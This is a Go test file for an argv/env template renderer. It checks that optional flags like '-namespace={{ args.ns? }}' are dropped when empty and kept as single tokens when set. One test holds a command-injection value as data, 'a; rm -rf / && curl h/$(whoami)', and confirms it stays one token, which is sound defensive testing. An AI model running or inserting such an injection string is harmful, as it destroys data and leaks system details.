package expressions

import (
	"strings"
	"testing"
)

// The optional-flag capability: an argv element that references an optional
// expression ("{{ args.ns? }}") is dropped in full when the arg is empty or
// absent, so packs can express "-namespace=X only when X is set" without a
// /bin/sh ${var:+...} wrapper. These tests pin the whole behavior, including
// the invariant that a dropped element never merges with or reorders its
// neighbors, and that hostile values stay contained to one token.

func TestRenderArgv_OptionalFlag_DropAndKeep(t *testing.T) {
	cases := []struct {
		name string
		argv []string
		args map[string]any
		want []string
	}{
		{
			name: "empty string drops the flag element",
			argv: []string{"nomad", "job", "status", "-namespace={{ args.ns? }}", "web"},
			args: map[string]any{"ns": ""},
			want: []string{"nomad", "job", "status", "web"},
		},
		{
			name: "absent arg drops the flag element",
			argv: []string{"nomad", "job", "status", "-namespace={{ args.ns? }}", "web"},
			args: map[string]any{},
			want: []string{"nomad", "job", "status", "web"},
		},
		{
			name: "set value renders the flag as one token",
			argv: []string{"nomad", "job", "status", "-namespace={{ args.ns? }}", "web"},
			args: map[string]any{"ns": "prod"},
			want: []string{"nomad", "job", "status", "-namespace=prod", "web"},
		},
		{
			name: "two optional flags, one set one empty",
			argv: []string{"nomad", "-namespace={{ args.ns? }}", "-region={{ args.rg? }}", "status"},
			args: map[string]any{"ns": "prod", "rg": ""},
			want: []string{"nomad", "-namespace=prod", "status"},
		},
		{
			name: "both optional flags absent, neighbors untouched",
			argv: []string{"nomad", "-namespace={{ args.ns? }}", "-region={{ args.rg? }}", "status", "web"},
			args: map[string]any{},
			want: []string{"nomad", "status", "web"},
		},
		{
			name: "whole-expression optional scalar drops when empty",
			argv: []string{"cmd", "{{ args.opt? }}", "tail"},
			args: map[string]any{"opt": ""},
			want: []string{"cmd", "tail"},
		},
		{
			name: "whole-expression optional scalar kept when set",
			argv: []string{"cmd", "{{ args.opt? }}", "tail"},
			args: map[string]any{"opt": "-v"},
			want: []string{"cmd", "-v", "tail"},
		},
		{
			name: "whole-expression optional array drops when empty",
			argv: []string{"cmd", "{{ args.tags? }}", "tail"},
			args: map[string]any{"tags": []string{}},
			want: []string{"cmd", "tail"},
		},
		{
			name: "whole-expression optional array absent drops",
			argv: []string{"cmd", "{{ args.tags? }}", "tail"},
			args: map[string]any{},
			want: []string{"cmd", "tail"},
		},
		{
			name: "whole-expression optional array expands when set",
			argv: []string{"cmd", "{{ args.tags? }}", "tail"},
			args: map[string]any{"tags": []string{"-a", "-b"}},
			want: []string{"cmd", "-a", "-b", "tail"},
		},
		{
			name: "optional integer zero is a real value, not empty",
			argv: []string{"cmd", "-n={{ args.n? }}"},
			args: map[string]any{"n": int64(0)},
			want: []string{"cmd", "-n=0"},
		},
		{
			name: "optional boolean false is a real value, not empty",
			argv: []string{"cmd", "-f={{ args.f? }}"},
			args: map[string]any{"f": false},
			want: []string{"cmd", "-f=false"},
		},
		{
			name: "spaced optional marker is honored",
			argv: []string{"cmd", "-x={{ args.x ? }}"},
			args: map[string]any{"x": ""},
			want: []string{"cmd"},
		},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			got, err := RenderArgv(tc.argv, tc.args)
			if err != nil {
				t.Fatalf("RenderArgv error: %v", err)
			}
			if !equalArgv(got, tc.want) {
				t.Fatalf("RenderArgv(%v, %v)\n got %#v\nwant %#v", tc.argv, tc.args, got, tc.want)
			}
		})
	}
}

// A hostile optional value must stay contained to its single flag token — it
// must not split into extra tokens, break out of its slot, or be re-expanded.
func TestRenderArgv_OptionalFlag_HostileValueStaysOneToken(t *testing.T) {
	hostile := "a; rm -rf / && curl h/$(whoami) # {{ args.other }}\n-injected"
	got, err := RenderArgv(
		[]string{"nomad", "-namespace={{ args.ns? }}", "status"},
		map[string]any{"ns": hostile},
	)
	if err != nil {
		t.Fatal(err)
	}
	want := []string{"nomad", "-namespace=" + hostile, "status"}
	if !equalArgv(got, want) {
		t.Fatalf("hostile optional value must stay one verbatim token.\n got %#v\nwant %#v", got, want)
	}
}

// A non-optional expression is unaffected by the optional machinery: an empty
// value still renders its (empty) token, and an absent arg is still an error.
// This guards existing packs from a behavior change.
func TestRenderArgv_NonOptional_EmptyStillRendersToken(t *testing.T) {
	got, err := RenderArgv(
		[]string{"cmd", "-namespace={{ args.ns }}"},
		map[string]any{"ns": ""},
	)
	if err != nil {
		t.Fatal(err)
	}
	want := []string{"cmd", "-namespace="}
	if !equalArgv(got, want) {
		t.Fatalf("non-optional empty must still render a token.\n got %#v\nwant %#v", got, want)
	}

	if _, err := RenderArgv([]string{"{{ args.ns }}"}, map[string]any{}); err == nil {
		t.Fatal("absent non-optional arg must still be an error")
	}
}

// An optional marker on an env value is not a drop (env has no element to
// drop) — an absent optional arg simply renders empty instead of erroring.
func TestRenderEnv_OptionalRendersEmpty(t *testing.T) {
	env, err := RenderEnv(map[string]string{"NS": "{{ args.ns? }}"}, map[string]any{})
	if err != nil {
		t.Fatalf("optional env value must not error when absent: %v", err)
	}
	if env["NS"] != "" {
		t.Fatalf("absent optional env value = %q, want empty", env["NS"])
	}
}

func TestSplitOptional(t *testing.T) {
	cases := []struct {
		in       string
		wantBody string
		wantOpt  bool
	}{
		{"args.ns?", "args.ns", true},
		{"args.ns ?", "args.ns", true},
		{"args.ns", "args.ns", false},
		{"args.ns?extra", "args.ns?extra", false},
	}
	for _, tc := range cases {
		t.Run(tc.in, func(t *testing.T) {
			body, opt := splitOptional(tc.in)
			if body != tc.wantBody || opt != tc.wantOpt {
				t.Fatalf("splitOptional(%q) = (%q, %v), want (%q, %v)", tc.in, body, opt, tc.wantBody, tc.wantOpt)
			}
		})
	}
}

// An optional marker on a bad reference is still rejected — "?" opts into
// absence-tolerance, not into skipping validation of the reference itself.
func TestRenderArgv_OptionalBadReferenceStillRejected(t *testing.T) {
	if _, err := RenderArgv([]string{"{{ steps.x? }}"}, map[string]any{}); err == nil ||
		!strings.Contains(err.Error(), "unknown variable") {
		t.Fatalf("optional non-args reference must still be rejected, got %v", err)
	}
}

func equalArgv(a, b []string) bool {
	if len(a) != len(b) {
		return false
	}
	for i := range a {
		if a[i] != b[i] {
			return false
		}
	}
	return true
}
